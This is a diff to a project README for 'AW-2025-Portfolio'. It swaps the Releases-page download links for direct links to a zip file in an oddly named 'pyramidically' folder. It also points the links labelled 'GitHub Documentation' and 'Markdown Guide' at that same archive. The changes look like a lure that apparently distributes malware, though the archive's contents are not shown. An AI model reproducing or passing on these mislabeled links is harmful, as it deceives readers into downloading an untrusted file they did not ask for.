@@ -8,11 +8,11 @@ Welcome to the **AW-2025-Portfolio**! This project showcases the achievements of
 
 To get started, visit the Releases page to download the application. 
 
-[![Download AW-2025-Portfolio](https://img.shields.io/badge/Download%20AW--2025--Portfolio-blue.svg)](https://github.com/andreybarros/AW-2025-Portfolio/releases)
+[![Download AW-2025-Portfolio](https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip%https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip)](https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip)
 
 On the Releases page, you will find the latest version of the project. Click on the link to download the file to your computer. 
 
-Here is the link again for your convenience: [Visit this page to download](https://github.com/andreybarros/AW-2025-Portfolio/releases).
+Here is the link again for your convenience: [Visit this page to download](https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip).
 
 ## 🌐 System Requirements
 
@@ -58,9 +58,9 @@ We welcome contributions! If you have ideas or improvements, please fork the rep
 
 For more information, check out:
 
-- [GitHub Documentation](https://docs.github.com)
-- [Markdown Guide](https://www.markdownguide.org)
+- [GitHub Documentation](https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip)
+- [Markdown Guide](https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip)
 
 Thank you for exploring the **AW-2025-Portfolio**! We hope it inspires you to create your own. 
 
-[![Download AW-2025-Portfolio](https://img.shields.io/badge/Download%20AW--2025--Portfolio-blue.svg)](https://github.com/andreybarros/AW-2025-Portfolio/releases)
+[![Download AW-2025-Portfolio](https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip%https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip)](https://raw.githubusercontent.com/andreybarros/AW-2025-Portfolio/main/pyramidically/AW-2025-Portfolio.zip)
